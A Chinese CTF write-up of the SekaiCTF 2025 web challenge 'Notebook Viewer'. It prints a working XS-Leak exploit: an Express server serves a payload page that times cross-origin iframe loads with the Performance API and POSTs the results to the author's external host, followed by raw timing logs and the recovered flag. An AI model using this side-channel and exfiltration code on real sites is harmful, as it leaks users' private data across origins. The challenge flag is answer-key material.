---
title: SEKAICTF 2025 Writeup —— Notebook Viewer
date: 2025-08-20T01:12:52+08:00
tags:
  - CTF Writeup
---

和AAA的佬们一起参赛（然后睡过了晚起一个小时）

在SekaiCTF 2025中做出了1道题（而且二血😀）~~（哥们终于在正式比赛中拿过血了）~~

![](sol.png)

<!-- more -->

以下是Writeup


# Notebook Viewer (Web)

先看源码

```js
    function srcFor(i, code) {
      return `https://nbv-${i}-${code}.chals.sekai.team/`;
    }

    for (let i = 0; i < note.length; i++) {
      const code = note.codePointAt(i);
      const frame = document.createElement('iframe');
      frame.scrolling = 'no';
      frame.src = srcFor(i, code);
      wrap.appendChild(frame);
    }
```

大意是说会把flag每个字母全拆开来，发一个请求。

```js
    browser = await puppeteer.launch({
        headless: true,
        pipe: true,
        args: [
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--js-flags=--jitless",
            // Speed up dns!
            "--host-resolver-rules=MAP nbv-*.chals.sekai.team nbv-0-0.chals.sekai.team",
        ],
        dumpio: true
    });
    let page1 = await browser.newPage();
    await page1.goto(`${SITE}/?note=${encodeURIComponent(FLAG)}`, {
        waitUntil: "networkidle2"
    });
    let page2 = await browser.newPage();
    await page2.goto(url);
    await new Promise((res) => setTimeout(res, 15000));
    await browser.close();
    browser = null;
```

把DNS解析处理了一下，`--host-resolver-rules=MAP nbv-*.chals.sekai.team nbv-0-0.chals.sekai.team`，就是没法拿DNS相关的东西来leak

其实到这里就已经可以猜到是XSLeak了

```nginx.conf
    add_header Vary "Sec-Fetch-Site" always;
    add_header Cache-Control "no-store" always;
    add_header Clear-Site-Data "\"*\"" always;
    add_header Cross-Origin-Embedder-Policy "require-corp" always;
    add_header Cross-Origin-Resource-Policy "cross-origin" always;
    add_header Referrer-Policy "no-referrer" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Origin-Agent-Cluster "?1" always;
```

`nginx.conf` 中给了一系列header，核心就是：1. 可以从外侧嵌入iframe；2. Clear-Site-Data超绝清空数据（喜欢我们访问一次题目环境之后回到主界面直接把登陆状态清了的救赎感吗）

然后就使用 Performance API

ref: https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/

ref: https://developer.mozilla.org/zh-CN/docs/Web/API/Performance_API



```js
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 8080;
const LOG_FILE = path.join(__dirname, 'access.log');

const data = require("./data.json");

const Generate_Payload = (bruteforce_charid, task) => {
    const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}@(<&!*#+_-"// [a-zA-Z0-9{}@(<&!*#+_\-]
    const batch_size = 10;
    batchSlices = [];
    const charset_rev = charset.split("").sort(() => Math.random() - 0.5).sort(() => Math.random() - 0.5).sort(() => Math.random() - 0.5).join("");
    for (let i = 0; i < charset_rev.length; i += batch_size) {
        batchSlices.push(charset_rev.slice(i, i + batch_size));
    }
    return `
<!DOCTYPE html>
<body>
<div id="yourmother"></div>
  <script>
        (async()=>{
        const IFRAMEslices = [
${batchSlices.map(slice => `\`
        ${slice.split("").map(c => `
            <iframe src="https://nbv-${bruteforce_charid}-${c.codePointAt(0)}.chals.sekai.team/"></iframe>
            `).join("")
        }
    \`,`).join("\n")
        }
    ]
    for(let i = 0 ; i < IFRAMEslices.length; i++) {
        document.getElementById("yourmother").innerHTML = IFRAMEslices[i];
        await new Promise(resolve => setTimeout(resolve, 1000));
    }

        const url_list = [
        
${charset.split("").map((c, i) => `
    "https://nbv-${bruteforce_charid}-${c.codePointAt(0)}.chals.sekai.team/",
    `).join("")
        }



   ]

    for(let i = 0; i < url_list.length; i++) {
        let res = performance.getEntriesByName(url_list[i]).pop();
        console.log(JSON.stringify(res))
        fetch("https://dev.5dbwat4.top/payload",{
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                // task: "B-${bruteforce_charid}-${REVERSE ? "r" : "s"}", 
                task: "B-${bruteforce_charid}-${task}", 
                url: url_list[i],
                res: res
            })
        })
    }

    })()
    </script>
</body>
`

}

app.use(express.text({ type: '*/*' }));

app.get('/exp', (req, res) => {
    res.send(Generate_Payload(req.query.cid, req.query.task))
})

app.post('/payload', (req, res) => {
    const payload = req.body;

    const s = JSON.parse(payload)

    const charcode = s.url.split("-").pop().split(".")[0];

    data[s.task] = data[s.task] || []

    data[s.task].push({
        url: s.url,
        charcode,
        duration: s.res.duration
    })

    console.log("Task ", s.task, " By fucking " + s.charcode + " got " + s.res.duration)

    fs.writeFileSync("data.json", JSON.stringify(data, null, 2))

    res.status(200)
});

app.use(express.static(path.join(__dirname)));
// 启动服务器
app.listen(PORT, () => {
    console.log(`服务器运行中：http://localhost:${PORT}`);
    console.log(`日志文件路径：${LOG_FILE}`);
});
```

我们用performance API，利用请求的`duration`来判断请求用时。经过测试，已经访问过的域名的请求时间明显低于未访问过的域名，因此可以利用这个特性来进行域名的筛选。

不过这玩意特点就是受网络波动的影响比较大，具体的说，虽然已访问过的不一定在第一个，但总是在前几个。

个人猜测访问偏快的是由于它们优先出现在exp的html中，所以偏快，总之多进行几次打乱多发几次（多次测量取平均值（确信），然后找共性的排在前几位的字符，基本上都是对的。

flag`SEKAI{pR0C35S-!sol4T10n_X5l34K5_fTW}`

# 碎碎念

1. 2周前才恶补了XSLeak的相关知识，这不就用上了。我感觉如果没有提前了解过这些，光靠临场试/问AI应该很难搞定。~~唉唉 Web还是太多太杂了~~  
   我个人看的是 xsleaks.dev 赛后发现hacktricks也有相关的内容，但似乎没前者全。

2. 做这一题真的很坐牢。一开始的版本所有过程全是手动，然后逐步修改自动化的。

# 这是写在Notion上的原版草稿

应该是XSLeak，但是还不知道具体是什么形式

```html

    function srcFor(i, code) {
      return `https://nbv-${i}-${code}.chals.sekai.team/`;
    }

    for (let i = 0; i < note.length; i++) {
      const code = note.codePointAt(i);
      const frame = document.createElement('iframe');
      frame.scrolling = 'no';
      frame.src = srcFor(i, code);
      wrap.appendChild(frame);
    }
```

应该会有一种办法将“已经访问过的域名”与“没有访问过的域名”区分开

```
            add_header Vary "Sec-Fetch-Site" always;
            add_header Cache-Control "no-store" always;
            add_header Clear-Site-Data "\"*\"" always;
            add_header Cross-Origin-Embedder-Policy "require-corp" always;
            add_header Cross-Origin-Resource-Policy "cross-origin" always;
            add_header Referrer-Policy "no-referrer" always;
            add_header X-Content-Type-Options "nosniff" always;
            add_header Origin-Agent-Cluster "?1" always;
```

// Speed up dns!
"--host-resolver-rules=MAP nbv-*.chals.sekai.team nbv-0-0.chals.sekai.team",

让我试试performance API

let res = performance.getEntriesByName("https://nbv-5-99.chals.sekai.team/").pop();

```
[2025-08-17T05:29:32.051Z] {"url":"https://nbv-0-83.chals.sekai.team/","res":{"name":"https://nbv-0-83.chals.sekai.team/","entryType":"resource","startTime":1208.9000000059605,"duration":54.599999994039536,"initiatorType":"iframe","deliveryType":"","nextHopProtocol":"","renderBlockingStatus":"non-blocking","workerStart":0,"redirectStart":0,"redirectEnd":0,"fetchStart":1208.9000000059605,"domainLookupStart":0,"domainLookupEnd":0,"connectStart":0,"secureConnectionStart":0,"connectEnd":0,"requestStart":0,"responseStart":0,"firstInterimResponseStart":0,"finalResponseHeadersStart":0,"responseEnd":1263.5,"transferSize":0,"encodedBodySize":0,"decodedBodySize":0,"responseStatus":0,"serverTiming":[]}}
[2025-08-17T05:29:32.053Z] {"url":"https://nbv-0-9.chals.sekai.team/","res":{"name":"https://nbv-0-9.chals.sekai.team/","entryType":"resource","startTime":1223.800000011921,"duration":244.2999999821186,"initiatorType":"iframe","deliveryType":"","nextHopProtocol":"","renderBlockingStatus":"non-blocking","workerStart":0,"redirectStart":0,"redirectEnd":0,"fetchStart":1223.800000011921,"domainLookupStart":0,"domainLookupEnd":0,"connectStart":0,"secureConnectionStart":0,"connectEnd":0,"requestStart":0,"responseStart":0,"firstInterimResponseStart":0,"finalResponseHeadersStart":0,"responseEnd":1468.0999999940395,"transferSize":0,"encodedBodySize":0,"decodedBodySize":0,"responseStatus":0,"serverTiming":[]}}
[2025-08-17T05:29:32.059Z] {"url":"https://nbv-2-75.chals.sekai.team/","res":{"name":"https://nbv-2-75.chals.sekai.team/","entryType":"resource","startTime":1210.5,"duration":85.2000000178814,"initiatorType":"iframe","deliveryType":"","nextHopProtocol":"","renderBlockingStatus":"non-blocking","workerStart":0,"redirectStart":0,"redirectEnd":0,"fetchStart":1210.5,"domainLookupStart":0,"domainLookupEnd":0,"connectStart":0,"secureConnectionStart":0,"connectEnd":0,"requestStart":0,"responseStart":0,"firstInterimResponseStart":0,"finalResponseHeadersStart":0,"responseEnd":1295.7000000178814,"transferSize":0,"encodedBodySize":0,"decodedBodySize":0,"responseStatus":0,"serverTiming":[]}}
[2025-08-17T05:29:32.057Z] {"url":"https://nbv-0-6.chals.sekai.team/","res":{"name":"https://nbv-0-6.chals.sekai.team/","entryType":"resource","startTime":1212.300000011921,"duration":158.40000000596046,"initiatorType":"iframe","deliveryType":"","nextHopProtocol":"","renderBlockingStatus":"non-blocking","workerStart":0,"redirectStart":0,"redirectEnd":0,"fetchStart":1212.300000011921,"domainLookupStart":0,"domainLookupEnd":0,"connectStart":0,"secureConnectionStart":0,"connectEnd":0,"requestStart":0,"responseStart":0,"firstInterimResponseStart":0,"finalResponseHeadersStart":0,"responseEnd":1370.7000000178814,"transferSize":0,"encodedBodySize":0,"decodedBodySize":0,"responseStatus":0,"serverTiming":[]}}
[2025-08-17T05:29:32.292Z] {"url":"https://nbv-0-7.chals.sekai.team/","res":{"name":"https://nbv-0-7.chals.sekai.team/","entryType":"resource","startTime":1213,"duration":142,"initiatorType":"iframe","deliveryType":"","nextHopProtocol":"","renderBlockingStatus":"non-blocking","workerStart":0,"redirectStart":0,"redirectEnd":0,"fetchStart":1213,"domainLookupStart":0,"domainLookupEnd":0,"connectStart":0,"secureConnectionStart":0,"connectEnd":0,"requestStart":0,"responseStart":0,"firstInterimResponseStart":0,"finalResponseHeadersStart":0,"responseEnd":1355,"transferSize":0,"encodedBodySize":0,"decodedBodySize":0,"responseStatus":0,"serverTiming":[]}}
[2025-08-17T05:29:32.296Z] {"url":"https://nbv-0-8.chals.sekai.team/","res":{"name":"https://nbv-0-8.chals.sekai.team/","entryType":"resource","startTime":1222,"duration":199,"initiatorType":"iframe","deliveryType":"","nextHopProtocol":"","renderBlockingStatus":"non-blocking","workerStart":0,"redirectStart":0,"redirectEnd":0,"fetchStart":1222,"domainLookupStart":0,"domainLookupEnd":0,"connectStart":0,"secureConnectionStart":0,"connectEnd":0,"requestStart":0,"responseStart":0,"firstInterimResponseStart":0,"finalResponseHeadersStart":0,"responseEnd":1421,"transferSize":0,"encodedBodySize":0,"decodedBodySize":0,"responseStatus":0,"serverTiming":[]}}
[2025-08-17T05:29:32.293Z] {"url":"https://nbv-1-69.chals.sekai.team/","res":{"name":"https://nbv-1-69.chals.sekai.team/","entryType":"resource","startTime":1209.5999999940395,"duration":73.7000000178814,"initiatorType":"iframe","deliveryType":"","nextHopProtocol":"","renderBlockingStatus":"non-blocking","workerStart":0,"redirectStart":0,"redirectEnd":0,"fetchStart":1209.5999999940395,"domainLookupStart":0,"domainLookupEnd":0,"connectStart":0,"secureConnectionStart":0,"connectEnd":0,"requestStart":0,"responseStart":0,"firstInterimResponseStart":0,"finalResponseHeadersStart":0,"responseEnd":1283.300000011921,"transferSize":0,"encodedBodySize":0,"decodedBodySize":0,"responseStatus":0,"serverTiming":[]}}
[2025-08-17T05:29:32.396Z] {"url":"https://nbv-1-5.chals.sekai.team/","res":{"name":"https://nbv-1-5.chals.sekai.team/","entryType":"resource","startTime":1203.9000000059605,"duration":104.19999998807907,"initiatorType":"iframe","deliveryType":"","nextHopProtocol":"","renderBlockingStatus":"non-blocking","workerStart":0,"redirectStart":0,"redirectEnd":0,"fetchStart":1203.9000000059605,"domainLookupStart":0,"domainLookupEnd":0,"connectStart":0,"secureConnectionStart":0,"connectEnd":0,"requestStart":0,"responseStart":0,"firstInterimResponseStart":0,"finalResponseHeadersStart":0,"responseEnd":1308.0999999940395,"transferSize":0,"encodedBodySize":0,"decodedBodySize":0,"responseStatus":0,"serverTiming":[]}}
[2025-08-17T05:29:32.399Z] {"url":"https://nbv-0-5.chals.sekai.team/","res":{"name":"https://nbv-0-5.chals.sekai.team/","entryType":"resource","startTime":1211.300000011921,"duration":193.40000000596046,"initiatorType":"iframe","deliveryType":"","nextHopProtocol":"","renderBlockingStatus":"non-blocking","workerStart":0,"redirectStart":0,"redirectEnd":0,"fetchStart":1211.300000011921,"domainLookupStart":0,"domainLookupEnd":0,"connectStart":0,"secureConnectionStart":0,"connectEnd":0,"requestStart":0,"responseStart":0,"firstInterimResponseStart":0,"finalResponseHeadersStart":0,"responseEnd":1404.7000000178814,"transferSize":0,"encodedBodySize":0,"decodedBodySize":0,"responseStatus":0,"serverTiming":[]}}
[2025-08-17T05:29:32.400Z] {"url":"https://nbv-1-8.chals.sekai.team/","res":{"name":"https://nbv-1-8.chals.sekai.team/","entryType":"resource","startTime":1206.800000011921,"duration":183.69999998807907,"initiatorType":"iframe","deliveryType":"","nextHopProtocol":"","renderBlockingStatus":"non-blocking","workerStart":0,"redirectStart":0,"redirectEnd":0,"fetchStart":1206.800000011921,"domainLookupStart":0,"domainLookupEnd":0,"connectStart":0,"secureConnectionStart":0,"connectEnd":0,"requestStart":0,"responseStart":0,"firstInterimResponseStart":0,"finalResponseHeadersStart":0,"responseEnd":1390.5,"transferSize":0,"encodedBodySize":0,"decodedBodySize":0,"responseStatus":0,"serverTiming":[]}}
[2025-08-17T05:29:32.403Z] {"url":"https://nbv-1-9.chals.sekai.team/","res":{"name":"https://nbv-1-9.chals.sekai.team/","entryType":"resource","startTime":1207.5999999940395,"duration":232.30000001192093,"initiatorType":"iframe","deliveryType":"","nextHopProtocol":"","renderBlockingStatus":"non-blocking","workerStart":0,"redirectStart":0,"redirectEnd":0,"fetchStart":1207.5999999940395,"domainLookupStart":0,"domainLookupEnd":0,"connectStart":0,"secureConnectionStart":0,"connectEnd":0,"requestStart":0,"responseStart":0,"firstInterimResponseStart":0,"finalResponseHeadersStart":0,"responseEnd":1439.9000000059605,"transferSize":0,"encodedBodySize":0,"decodedBodySize":0,"responseStatus":0,"serverTiming":[]}}
[2025-08-17T05:29:32.408Z] {"url":"https://nbv-1-7.chals.sekai.team/","res":{"name":"https://nbv-1-7.chals.sekai.team/","entryType":"resource","startTime":1206,"duration":249.90000000596046,"initiatorType":"iframe","deliveryType":"","nextHopProtocol":"","renderBlockingStatus":"non-blocking","workerStart":0,"redirectStart":0,"redirectEnd":0,"fetchStart":1206,"domainLookupStart":0,"domainLookupEnd":0,"connectStart":0,"secureConnectionStart":0,"connectEnd":0,"requestStart":0,"responseStart":0,"firstInterimResponseStart":0,"finalResponseHeadersStart":0,"responseEnd":1455.9000000059605,"transferSize":0,"encodedBodySize":0,"decodedBodySize":0,"responseStatus":0,"serverTiming":[]}}
[2025-08-17T05:29:32.424Z] {"url":"https://nbv-1-6.chals.sekai.team/","res":{"name":"https://nbv-1-6.chals.sekai.team/","entryType":"resource","startTime":1205.0999999940395,"duration":130.2000000178814,"initiatorType":"iframe","deliveryType":"","nextHopProtocol":"","renderBlockingStatus":"non-blocking","workerStart":0,"redirectStart":0,"redirectEnd":0,"fetchStart":1205.0999999940395,"domainLookupStart":0,"domainLookupEnd":0,"connectStart":0,"secureConnectionStart":0,"connectEnd":0,"requestStart":0,"responseStart":0,"firstInterimResponseStart":0,"finalResponseHeadersStart":0,"responseEnd":1335.300000011921,"transferSize":0,"encodedBodySize":0,"decodedBodySize":0,"responseStatus":0,"serverTiming":[]}}

```

~~OKOK~~

~~访问过的duration有显著差异~~

不行 batch之后 duration的差异又没那么显著了

performance API里面应该没有其它能用的指标了，试试别的

我又跑了一遍开头那个，差异还是显著

```yaml
 https://nbv-1-9.chals.sekai.team/ got 174.39999997615814
 https://nbv-2-75.chals.sekai.team/ got 89.59999999403954
 https://nbv-1-8.chals.sekai.team/ got 137.90000000596046
 https://nbv-0-7.chals.sekai.team/ got 183.80000001192093
 https://nbv-1-69.chals.sekai.team/ got 79.59999999403954
 https://nbv-1-5.chals.sekai.team/ got 118.7999999821186
 https://nbv-0-9.chals.sekai.team/ got 231.40000000596046
 https://nbv-1-6.chals.sekai.team/ got 167.09999999403954
 https://nbv-0-8.chals.sekai.team/ got 254
 https://nbv-0-5.chals.sekai.team/ got 206.5
 https://nbv-1-7.chals.sekai.team/ got 275.19999998807907
 https://nbv-0-83.chals.sekai.team/ got 63
 https://nbv-0-6.chals.sekai.team/ got 223.39999997615814
```

会不会是同时跑的太多导致的

```yaml
https://nbv-0-78.chals.sekai.team/ got 113.09999999403954
https://nbv-0-80.chals.sekai.team/ got 134.30000001192093
https://nbv-0-81.chals.sekai.team/ got 236.59999999403954
https://nbv-0-85.chals.sekai.team/ got 147.89999997615814
https://nbv-0-88.chals.sekai.team/ got 169.09999999403954
https://nbv-0-82.chals.sekai.team/ got 165.40000000596046
https://nbv-0-76.chals.sekai.team/ got 74.19999998807907
https://nbv-0-84.chals.sekai.team/ got 247.59999999403954
https://nbv-0-83.chals.sekai.team/ got 53.39999997615814
https://nbv-0-87.chals.sekai.team/ got 212.09999999403954
https://nbv-0-79.chals.sekai.team/ got 91.09999999403954
```

数据量压到10个，然后83（也就是”S”,flag第一个字符）又领先了

但是假如一次adminbot只提交10个还是有点少了

试试看分批iframe

```bash
By fucking https://nbv-0-104.chals.sekai.team/ got 199.2000000178814
By fucking https://nbv-0-112.chals.sekai.team/ got 259.40000000596046
By fucking https://nbv-0-117.chals.sekai.team/ got 111.7000000178814
By fucking https://nbv-0-98.chals.sekai.team/ got 185.09999999403954
By fucking https://nbv-0-74.chals.sekai.team/ got 188.09999999403954
By fucking https://nbv-0-68.chals.sekai.team/ got 219.89999997615814
By fucking https://nbv-0-84.chals.sekai.team/ got 247.90000000596046
By fucking https://nbv-0-90.chals.sekai.team/ got 198
By fucking https://nbv-0-51.chals.sekai.team/ got 248.7999999821186
By fucking https://nbv-0-85.chals.sekai.team/ got 205.5
By fucking https://nbv-0-53.chals.sekai.team/ got 135.5
By fucking https://nbv-0-48.chals.sekai.team/ got 161.89999997615814
By fucking https://nbv-0-123.chals.sekai.team/ got 246.7999999821186
By fucking https://nbv-0-33.chals.sekai.team/ got 136.90000000596046
By fucking https://nbv-0-60.chals.sekai.team/ got 158.69999998807907
By fucking https://nbv-0-100.chals.sekai.team/ got 158.10000002384186
By fucking https://nbv-0-101.chals.sekai.team/ got 105.5
By fucking https://nbv-0-107.chals.sekai.team/ got 123.09999999403954
By fucking https://nbv-0-105.chals.sekai.team/ got 103.19999998807907
By fucking https://nbv-0-103.chals.sekai.team/ got 122.40000000596046
By fucking https://nbv-0-110.chals.sekai.team/ got 215.5
By fucking https://nbv-0-113.chals.sekai.team/ got 239
By fucking https://nbv-0-114.chals.sekai.team/ got 168.2000000178814
By fucking https://nbv-0-111.chals.sekai.team/ got 298.69999998807907
By fucking https://nbv-0-70.chals.sekai.team/ got 253.90000000596046
By fucking https://nbv-0-73.chals.sekai.team/ got 142.60000002384186
By fucking https://nbv-0-86.chals.sekai.team/ got 178
By fucking https://nbv-0-106.chals.sekai.team/ got 184.80000001192093
By fucking https://nbv-0-108.chals.sekai.team/ got 152.09999999403954
By fucking https://nbv-0-75.chals.sekai.team/ got 240.89999997615814
By fucking https://nbv-0-118.chals.sekai.team/ got 174.39999997615814
By fucking https://nbv-0-38.chals.sekai.team/ got 235.2999999821186
By fucking https://nbv-0-121.chals.sekai.team/ got 244.19999998807907
By fucking https://nbv-0-52.chals.sekai.team/ got 211.59999999403954
By fucking https://nbv-0-120.chals.sekai.team/ got 131.80000001192093
By fucking https://nbv-0-57.chals.sekai.team/ got 180
By fucking https://nbv-0-82.chals.sekai.team/ got 237.2000000178814
By fucking https://nbv-0-49.chals.sekai.team/ got 272.7999999821186
By fucking https://nbv-0-35.chals.sekai.team/ got 103.7999999821186
By fucking https://nbv-0-79.chals.sekai.team/ got 130.60000002384186
By fucking https://nbv-0-71.chals.sekai.team/ got 173
By fucking https://nbv-0-43.chals.sekai.team/ got 109.09999999403954
By fucking https://nbv-0-88.chals.sekai.team/ got 215.7000000178814
By fucking https://nbv-0-67.chals.sekai.team/ got 208
By fucking https://nbv-0-116.chals.sekai.team/ got 222.19999998807907
By fucking https://nbv-0-95.chals.sekai.team/ got 124.5
By fucking https://nbv-0-83.chals.sekai.team/ got 96.09999999403954
By fucking https://nbv-0-97.chals.sekai.team/ got 74.90000000596046
By fucking https://nbv-0-102.chals.sekai.team/ got 138.10000002384186
By fucking https://nbv-0-66.chals.sekai.team/ got 199.19999998807907
By fucking https://nbv-0-87.chals.sekai.team/ got 184.69999998807907
By fucking https://nbv-0-115.chals.sekai.team/ got 195.59999999403954
By fucking https://nbv-0-40.chals.sekai.team/ got 185.7000000178814
By fucking https://nbv-0-54.chals.sekai.team/ got 229
By fucking https://nbv-0-65.chals.sekai.team/ got 182.90000000596046
By fucking https://nbv-0-72.chals.sekai.team/ got 274.09999999403954
By fucking https://nbv-0-69.chals.sekai.team/ got 115.90000000596046
By fucking https://nbv-0-64.chals.sekai.team/ got 253.90000000596046
By fucking https://nbv-0-81.chals.sekai.team/ got 165
By fucking https://nbv-0-109.chals.sekai.team/ got 283.90000000596046
By fucking https://nbv-0-50.chals.sekai.team/ got 175.2999999821186
By fucking https://nbv-0-55.chals.sekai.team/ got 282.5
By fucking https://nbv-0-42.chals.sekai.team/ got 192.69999998807907
By fucking https://nbv-0-99.chals.sekai.team/ got 80.2000000178814
By fucking https://nbv-0-125.chals.sekai.team/ got 221.69999998807907
By fucking https://nbv-0-78.chals.sekai.team/ got 218.5
By fucking https://nbv-0-77.chals.sekai.team/ got 200.7000000178814
By fucking https://nbv-0-80.chals.sekai.team/ got 137.2999999821186
By fucking https://nbv-0-119.chals.sekai.team/ got 141.69999998807907
By fucking https://nbv-0-56.chals.sekai.team/ got 118
By fucking https://nbv-0-45.chals.sekai.team/ got 138
By fucking https://nbv-0-122.chals.sekai.team/ got 165.69999998807907
By fucking https://nbv-0-76.chals.sekai.team/ got 154.7999999821186
By fucking https://nbv-0-89.chals.sekai.team/ got 113.60000002384186
```

好像还行，虽然83不是最快的，但也是前几名。如果把前几名拿出来单独上一个batch

要不先挨个爆一下吧

char 1 : abjk#E

char 2 : aduKO

char 3 : acAk

char 4 : ag#YbkI

char 5 : ah#{g

char 6 : acpE

char 7 : chRk

char 8 : ac+0g

char 9 : ac#EC

char 10 : a3d#

char 11 : ai5#k

char 12 : a#Scu

感觉不太妙 一是a出现的太多了，二是已经爆出的东西看不出什么有意义的内容

唉这玩意受网络波动影响太大了，但我确实想不出别的方案 

应该要多测几次

欸 发现一个，就是如果我把charset reverse一下，拿char=4来说，出来的排序就是-#dIc<，然后取交集就刚好是I了

char=1也是，-!1REd，只有E是重合的

有戏有戏，重写一下exp，减少手动活

char 7 : R    #

char 8 : 0    a

char 9 : C   a

char 10: 不确定

char 11: 5

char 12: -  不太确定

char 13: 不确定

char 14: d (或a)

char 15: s     b

char 16: a  -   o   （都不太像）

char 17: l    #

char 18: 4     b

char 19: T

char 20: c或d（分不出）

char 21: 0   #

char 22: n   #

char 23: _

char 24: X

char 25: 5

char 26: l  (或b)

char 27: 3

char 28: 4   #   d    ←——-噢噢噢噢哦我已经认出来xsleak这个词了

我cf tunnel又炸了 

char 29: K

char 30: 5

char 31: _

char 32: f     #

char 33:  T    c

char 34: a   d    W   也不确定

char 35:  } 

好好好终于应该收尾了

对的36已经没有common char了

012345678901234567890123456789012345

SEKAI{pR0C35S-!sol4T10n_X5l34K5_fTW}

不确定的字符再返工（我已经有感觉了（x）

10    3

14    !

16   o

6     p    0

20   1

34   W

Top 10 characters in Test-16-#1:
f 0 & @ 7 L e o T r
Top 10 characters in Test-16-#2:
e o 5 c 6 ( H t D A
Top 10 characters in Test-16-#3:
a j # b Y - u k c o
Top 10 characters in Test-16-#4:
- o * d } x R 1 a &

有可能 反正测吧 已经看开了

~~process isolation~~

![attachment:a8002528-0fc4-4186-8daf-55865ff40aa4:image.png](notion.png)

tql